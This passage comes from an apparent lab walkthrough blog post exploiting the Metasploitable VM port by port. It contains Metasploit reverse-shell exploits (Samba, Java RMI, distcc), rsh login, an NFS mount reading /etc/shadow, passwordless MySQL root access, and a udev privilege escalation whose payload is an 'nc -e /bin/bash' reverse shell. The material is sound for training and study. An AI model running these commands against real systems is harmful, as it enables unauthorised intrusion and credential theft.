</span><span class='line'>   SMBDomain  WORKGROUP        no        The Windows domain to use for authentication
</span><span class='line'>   SMBPass                     no        The password for the specified username
</span><span class='line'>   SMBUser                     no        The username to authenticate as
</span><span class='line'>   THREADS    1                yes       The number of concurrent threads
</span><span class='line'>
</span><span class='line'>msf auxiliary(smb_version) &gt; set RHOSTS 192.168.127.154
</span><span class='line'>RHOSTS =&gt; 192.168.127.154
</span><span class='line'>msf auxiliary(smb_version) &gt; run
</span><span class='line'>
</span><span class='line'>[*] 192.168.127.154:445 is running Unix Samba 3.0.20-Debian (language: Unknown) (domain:WORKGROUP)
</span><span class='line'>[*] Scanned 1 of 1 hosts (100% complete)
</span><span class='line'>[*] Auxiliary module execution completed</span></code></pre></td></tr></table></div></figure>


<p>With that information in hand, we can now use a suitable exploit against the target:</p>

<p><strong>Samba &ldquo;username map script&rdquo; Command Execution</strong></p>

<blockquote><p>This module exploits a command execution vulerability in Samba versions 3.0.20 through 3.0.25rc3 when using the non-default &ldquo;username map
script&rdquo; configuration option. By specifying a username containing shell meta characters, attackers can execute arbitrary commands. No
authentication is needed to exploit this vulnerability since this option is used to map usernames prior to authentication!</p></blockquote>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use exploit/multi/samba/usermap_script
</span><span class='line'>msf exploit(usermap_script) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (exploit/multi/samba/usermap_script):
</span><span class='line'>
</span><span class='line'>   Name   Current Setting  Required  Description
</span><span class='line'>   ----   ---------------  --------  -----------
</span><span class='line'>   RHOST                   yes       The target address
</span><span class='line'>   RPORT  139              yes       The target port
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Automatic
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf exploit(usermap_script) &gt; set RHOST 192.168.127.154
</span><span class='line'>RHOST =&gt; 192.168.127.154
</span><span class='line'>msf exploit(usermap_script) &gt; set payload cmd/unix/reverse
</span><span class='line'>payload =&gt; cmd/unix/reverse
</span><span class='line'>msf exploit(usermap_script) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (exploit/multi/samba/usermap_script):
</span><span class='line'>
</span><span class='line'>   Name   Current Setting  Required  Description
</span><span class='line'>   ----   ---------------  --------  -----------
</span><span class='line'>   RHOST  192.168.127.154  yes       The target address
</span><span class='line'>   RPORT  139              yes       The target port
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Payload options (cmd/unix/reverse):
</span><span class='line'>
</span><span class='line'>   Name   Current Setting  Required  Description
</span><span class='line'>   ----   ---------------  --------  -----------
</span><span class='line'>   LHOST                   yes       The listen address
</span><span class='line'>   LPORT  4444             yes       The listen port
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Automatic
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf exploit(usermap_script) &gt; set LHOST 192.168.127.159
</span><span class='line'>LHOST =&gt; 192.168.127.159
</span><span class='line'>msf exploit(usermap_script) &gt; set RPORT 445
</span><span class='line'>RPORT =&gt; 445
</span><span class='line'>msf exploit(usermap_script) &gt; exploit
</span><span class='line'>
</span><span class='line'>[*] Started reverse double handler
</span><span class='line'>[*] Accepted the first client connection...
</span><span class='line'>[*] Accepted the second client connection...
</span><span class='line'>[*] Command: echo f8rjvIDZRdKBtu0F;
</span><span class='line'>[*] Writing to socket A
</span><span class='line'>[*] Writing to socket B
</span><span class='line'>[*] Reading from sockets...
</span><span class='line'>[*] Reading from socket B
</span><span class='line'>[*] B: "f8rjvIDZRdKBtu0F\r\n"
</span><span class='line'>[*] Matching...
</span><span class='line'>[*] A is input...
</span><span class='line'>[*] Command shell session 1 opened (192.168.127.159:4444 -&gt; 192.168.127.154:46653) at 2014-06-04 22:23:23 +0300
</span><span class='line'>
</span><span class='line'>whoami
</span><span class='line'>root
</span></code></pre></td></tr></table></div></figure>


<h3>Port 514 tcpwrapped</h3>

<p>The nmap scan revealed the port is open but it&rsquo;s tcpwrapped. Let&rsquo;s first see what that means:</p>

<blockquote><p>TCP Wrapper is a host-based networking access control list system, used to filter network access to Internet Protocol servers on (Unix-
like) operating systems such as Linux or BSD.  (Wikipedia)</p></blockquote>

<p>So we can conclude the port is protected by TCP Wrapper. If we try to netcat to the port, we see this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -vvn 192.168.127.154 514
</span><span class='line'>
</span><span class='line'>(UNKNOWN) [192.168.127.154] 514 (shell) open</span></code></pre></td></tr></table></div></figure>


<p>I ran a Nessus scan against the target, and according to the report, a critical vulnerability is present on this port:</p>

<p><strong>rsh Unauthenticated Access (via finger Information)</strong></p>

<p><strong>Synopsis</strong></p>

<p>It was possible to log on this machine without password.</p>

<p><strong>Description</strong></p>

<p>Using common usernames as well as the usernames reported by &lsquo;finger&rsquo;, Nessus was able to log in through rsh. Either the accounts are not protected by passwords or the ~/.rhosts files are not configured properly.</p>

<p>This vulnerability is confirmed to exist in Cisco Prime LAN Management Solution, but could be present on any host that is not securely configured.</p>

<p><strong>Port</strong><br/>
tcp/514</p>

<p>So all we have to do is log in via the remote shell program:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>rsh 192.168.127.154
</span><span class='line'>
</span><span class='line'>Last login: Wed May  7 11:00:37 EDT 2014 from :0.0 on pts/0
</span><span class='line'>
</span><span class='line'>Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686
</span><span class='line'>
</span><span class='line'>The programs included with the Ubuntu system are free software;
</span><span class='line'>
</span><span class='line'>the exact distribution terms for each program are described in the
</span><span class='line'>
</span><span class='line'>individual files in /usr/share/doc/*/copyright.
</span><span class='line'>
</span><span class='line'>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
</span><span class='line'>
</span><span class='line'>applicable law.
</span><span class='line'>
</span><span class='line'>To access official Ubuntu documentation, please visit:
</span><span class='line'>
</span><span class='line'>http://help.ubuntu.com/
</span><span class='line'>
</span><span class='line'>You have mail.
</span><span class='line'>
</span><span class='line'>root@metasploitable:~#</span></code></pre></td></tr></table></div></figure>


<h3>Port 1099 java-rmi</h3>

<p>Let&rsquo;s continue our exploitation. Anything labeled Java is bound to be interesting from a security perspective :)</p>

<p>Searching for Java exploits yielded something interesting:</p>

<p><strong>Java RMI Server Insecure Default Configuration Java Code Execution</strong></p>

<blockquote><p>This module takes advantage of the default configuration of the RMI Registry and RMI Activation services, which allow loading classes from
any remote (HTTP) URL. As it invokes a method in the RMI Distributed Garbage Collector which is available via every RMI endpoint, it can be
used against both rmiregistry and rmid, and against most other (custom) RMI endpoints as well. Note that it does not work against Java
Management Extension (JMX) ports since those do not support remote class loading, unless another RMI endpoint is active in the same Java
process. RMI method calls do not support or require any sort of authentication.</p></blockquote>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use exploit/multi/misc/java_rmi_server  
</span><span class='line'>msf exploit(java_rmi_server) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (exploit/multi/misc/java_rmi_server):
</span><span class='line'>
</span><span class='line'>   Name     Current Setting  Required  Description
</span><span class='line'>   ----     ---------------  --------  -----------
</span><span class='line'>   RHOST                     yes       The target address
</span><span class='line'>   RPORT    1099             yes       The target port
</span><span class='line'>   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
</span><span class='line'>   SRVPORT  8080             yes       The local port to listen on.
</span><span class='line'>   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
</span><span class='line'>   URIPATH                   no        The URI to use for this exploit (default is random)
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Generic (Java Payload)
</span><span class='line'>
</span><span class='line'>msf exploit(java_rmi_server) &gt; set RHOST 192.168.127.154
</span><span class='line'>RHOST =&gt; 192.168.127.154
</span><span class='line'>
</span><span class='line'>msf exploit(java_rmi_server) &gt; set payload java/meterpreter/reverse_tcp
</span><span class='line'>payload =&gt; java/meterpreter/reverse_tcp
</span><span class='line'>msf exploit(java_rmi_server) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (exploit/multi/misc/java_rmi_server):
</span><span class='line'>
</span><span class='line'>   Name     Current Setting  Required  Description
</span><span class='line'>   ----     ---------------  --------  -----------
</span><span class='line'>   RHOST    192.168.127.154  yes       The target address
</span><span class='line'>   RPORT    1099             yes       The target port
</span><span class='line'>   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
</span><span class='line'>   SRVPORT  8080             yes       The local port to listen on.
</span><span class='line'>   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
</span><span class='line'>   URIPATH                   no        The URI to use for this exploit (default is random)
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Payload options (java/meterpreter/reverse_tcp):
</span><span class='line'>
</span><span class='line'>   Name   Current Setting  Required  Description
</span><span class='line'>   ----   ---------------  --------  -----------
</span><span class='line'>   LHOST                   yes       The listen address
</span><span class='line'>   LPORT  4444             yes       The listen port
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Generic (Java Payload)
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf exploit(java_rmi_server) &gt; set LHOST 192.168.127.159
</span><span class='line'>LHOST =&gt; 192.168.127.159
</span><span class='line'>msf exploit(java_rmi_server) &gt; exploit
</span><span class='line'>
</span><span class='line'>[*] Started reverse handler on 192.168.127.159:4444 
</span><span class='line'>[*] Using URL: http://0.0.0.0:8080/oVUJAkfU
</span><span class='line'>[*]  Local IP: http://192.168.127.159:8080/oVUJAkfU
</span><span class='line'>[*] Connected and sending request for http://192.168.127.159:8080/oVUJAkfU/WAHKp.jar
</span><span class='line'>[*] 192.168.127.154  java_rmi_server - Replied to request for payload JAR
</span><span class='line'>[*] Sending stage (30355 bytes) to 192.168.127.154
</span><span class='line'>[*] Meterpreter session 2 opened (192.168.127.159:4444 -&gt; 192.168.127.154:36965) at 2014-06-04 22:42:17 +0300
</span><span class='line'>[+] Target 192.168.127.154:1099 may be exploitable...
</span><span class='line'>[*] Server stopped.
</span><span class='line'>
</span><span class='line'>meterpreter &gt; getuid
</span><span class='line'>Server username: root
</span><span class='line'>meterpreter &gt; </span></code></pre></td></tr></table></div></figure>


<h3>Port 1524 shell</h3>

<p>Well, not much to say here. There&rsquo;s already a nice, cozy shell waiting for connections, so nothing extra needs to be done.</p>

<h3>Port 2049 nfs</h3>

<p>Let&rsquo;s use the the <strong>showmount</strong> command to see the NFS server&rsquo;s export list. This command displays mount information for an NFS server. The -e flag is for showing exports:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>showmount -e 192.168.127.154
</span><span class='line'>
</span><span class='line'>Export list for 192.168.127.154:
</span><span class='line'>
</span><span class='line'>/ *</span></code></pre></td></tr></table></div></figure>


<p>How nice! The root directory is shared. So, let&rsquo;s mount it then:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mkdir /metafs # this will be the mount point
</span><span class='line'>
</span><span class='line'>mount -t nfs 192.168.127.154:/ /metafs -o nolock # mount the remote shared directory as nfs and disable file locking</span></code></pre></td></tr></table></div></figure>


<p>Now we can read  the passwords and everything else:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat /metafs/etc/shadow
</span><span class='line'>
</span><span class='line'>root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
</span><span class='line'>
</span><span class='line'>..........etc..........</span></code></pre></td></tr></table></div></figure>


<h3>Port 3306 mysql</h3>

<p>The Nessus scan that I ran against the target revealed the following:</p>

<p><strong>MySQL Unpassworded Account Check</strong></p>

<p><strong>Synopsis</strong></p>

<p>The remote database server can be accessed without a password.</p>

<p><strong>Description</strong></p>

<p>It is possible to connect to the remote MySQL database server using an unpassworded account. This may allow an
attacker to launch further attacks against the database.</p>

<p>The &lsquo;root&rsquo; account does not have a password.
Here is the list of databases on the remote server :
&ndash; information_schema
&ndash; dvwa
&ndash; metasploit
&ndash; mysql
&ndash; owasp10
&ndash; tikiwiki
&ndash; tikiwiki195</p>

<p>Let&rsquo;s see if we can indeed connect to the database as root without a password:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mysql -u root -p -h 192.168.127.154
</span><span class='line'>Enter password: 
</span><span class='line'>Welcome to the MySQL monitor.  Commands end with ; or \g.
</span><span class='line'>Your MySQL connection id is 7
</span><span class='line'>Server version: 5.0.51a-3ubuntu5 (Ubuntu)
</span><span class='line'>
</span><span class='line'>Copyright (c) 2000, 2014, Oracle and/or its affiliates. All rights reserved.
</span><span class='line'>
</span><span class='line'>Oracle is a registered trademark of Oracle Corporation and/or its
</span><span class='line'>affiliates. Other names may be trademarks of their respective
</span><span class='line'>owners.
</span><span class='line'>
</span><span class='line'>Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
</span><span class='line'>
</span><span class='line'>mysql&gt; </span></code></pre></td></tr></table></div></figure>


<p>Now we can look inside the databases and get any data that might interest us.</p>

<h3>Port 3632 distccd</h3>

<p>distccd  is  the  server  for  the  distcc distributed compiler. It accepts and runs compilation jobs for network clients. Metasploit has an exploit avaiable for this:</p>

<p><strong>DistCC Daemon Command Execution</strong></p>

<blockquote><p>This module uses a documented security weakness to execute arbitrary commands on any system running distccd.</p></blockquote>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use exploit/unix/misc/distcc_exec
</span><span class='line'>msf exploit(distcc_exec) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (exploit/unix/misc/distcc_exec):
</span><span class='line'>
</span><span class='line'>   Name   Current Setting  Required  Description
</span><span class='line'>   ----   ---------------  --------  -----------
</span><span class='line'>   RHOST                   yes       The target address
</span><span class='line'>   RPORT  3632             yes       The target port
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Automatic Target
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf exploit(distcc_exec) &gt; set RHOST 192.168.127.154
</span><span class='line'>RHOST =&gt; 192.168.127.154
</span><span class='line'>msf exploit(distcc_exec) &gt; set payload cmd/unix/reverse
</span><span class='line'>payload =&gt; cmd/unix/reverse
</span><span class='line'>msf exploit(distcc_exec) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (exploit/unix/misc/distcc_exec):
</span><span class='line'>
</span><span class='line'>   Name   Current Setting  Required  Description
</span><span class='line'>   ----   ---------------  --------  -----------
</span><span class='line'>   RHOST  192.168.127.154  yes       The target address
</span><span class='line'>   RPORT  3632             yes       The target port
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Payload options (cmd/unix/reverse):
</span><span class='line'>
</span><span class='line'>   Name   Current Setting  Required  Description
</span><span class='line'>   ----   ---------------  --------  -----------
</span><span class='line'>   LHOST                   yes       The listen address
</span><span class='line'>   LPORT  4444             yes       The listen port
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Automatic Target
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf exploit(distcc_exec) &gt; set LHOST 192.168.127.159
</span><span class='line'>LHOST =&gt; 192.168.127.159
</span><span class='line'>msf exploit(distcc_exec) &gt; exploit
</span><span class='line'>
</span><span class='line'>[*] Started reverse double handler
</span><span class='line'>[*] Accepted the first client connection...
</span><span class='line'>[*] Accepted the second client connection...
</span><span class='line'>[*] Command: echo VhuwDGXAoBmUMNcg;
</span><span class='line'>[*] Writing to socket A
</span><span class='line'>[*] Writing to socket B
</span><span class='line'>[*] Reading from sockets...
</span><span class='line'>[*] Reading from socket B
</span><span class='line'>[*] B: "VhuwDGXAoBmUMNcg\r\n"
</span><span class='line'>[*] Matching...
</span><span class='line'>[*] A is input...
</span><span class='line'>[*] Command shell session 1 opened (192.168.127.159:4444 -&gt; 192.168.127.154:52283) at 2014-06-05 21:34:46 +0300
</span><span class='line'>
</span><span class='line'>whoami
</span><span class='line'>daemon</span></code></pre></td></tr></table></div></figure>


<p>So we have a low privilege account. Time for some local privilege escalation. I will use this exploit: <a href="http://www.exploit-db.com/exploits/8572/">http://www.exploit-db.com/exploits/8572/</a></p>

<p><strong>Description</strong></p>

<p>udev before 1.4.1 does not verify whether a NETLINK message originates from kernel space, which allows local users to gain privileges by sending a NETLINK message from user space.</p>

<p><strong>Usage</strong></p>

<p>Pass the PID of the udevd netlink socket (listed in /proc/net/netlink, usually is the udevd PID minus 1) as argv[1].</p>

<p>The exploit will execute /tmp/run as root so throw whatever payload you want in there.</p>

<p>Ok, on the command line on the victim, I looked for netcat and fortunately, it&rsquo;s installed:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>whereis nc
</span><span class='line'>nc: /bin/nc.traditional /bin/nc /usr/share/man/man1/nc.1.gz</span></code></pre></td></tr></table></div></figure>


<p>So I will compile the exploit and send it over netcat. I am on a 64 bit Kali and the target is 32 bit, so I compile it explicitly for 32 bit:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gcc -m32 8572.c -o 8572
</span><span class='line'>nc -vv -l -p 5555 &lt; 8572</span></code></pre></td></tr></table></div></figure>


<p>From the victim, I go to the /tmp/ directory and grab the exploit from the attacking machine:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -v -n 192.168.127.159 5555 &gt; 8572</span></code></pre></td></tr></table></div></figure>


<p>Next, let&rsquo;s look for the PID:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat /proc/net/netlink</span></code></pre></td></tr></table></div></figure>


<p>And the relevant line is:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sk       Eth Pid    Groups   Rmem     Wmem     Dump     Locks
</span><span class='line'>df8cc200 15  2767   00000001 0        0        00000000 2</span></code></pre></td></tr></table></div></figure>


<p>Check that this is the correct PID by looking at the udev service:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ps aux | grep udev
</span><span class='line'>root      2768  0.0  0.1   2092   620 ?        S&lt;s  14:11   0:00 /sbin/udevd --daemon</span></code></pre></td></tr></table></div></figure>


<p>It appears to be the right one (2768 &ndash; 1 = 2767)</p>

<p>Next, put some payload in /tmp/run, since that will be executed by the exploit. I will use netcat to connect to the atacker machine and give it a shell:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>echo '#!/bin/bash' &gt; /tmp/run
</span><span class='line'>echo 'nc -e /bin/bash 192.168.127.159 5555' &gt;&gt; /tmp/run</span></code></pre></td></tr></table></div></figure>


<p>On the attacker machine, listen on port 5555:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -v -l -p 5555</span></code></pre></td></tr></table></div></figure>


<p>And on the victim machine, now that all is set up, I just make the exploit executable and run it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>chmod +x 8572
</span><span class='line'>./8572 2767</span></code></pre></td></tr></table></div></figure>


<p>Now check our local netcat listener for the root shell:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc: connect to 192.168.127.159 5555 from 192.168.127.154 (192.168.127.154) 35539 [35539]
</span><span class='line'>whoami
</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>


<p>A bit on effort on that one, but all the more rewarding! Let&rsquo;s move on.</p>

<h3>Port 5432 postgresql</h3>

<p>Since I already saw earlier that the mysql database wasn&rsquo;t password protected, I will try a bruteforce auxiliary module to see if I can get in this one.</p>

<p><strong>PostgreSQL Login Utility</strong></p>

<blockquote><p>This module attempts to authenticate against a PostgreSQL instance using username and password combinations indicated by the USER_FILE, PASS_FILE, and
USERPASS_FILE options.</p></blockquote>

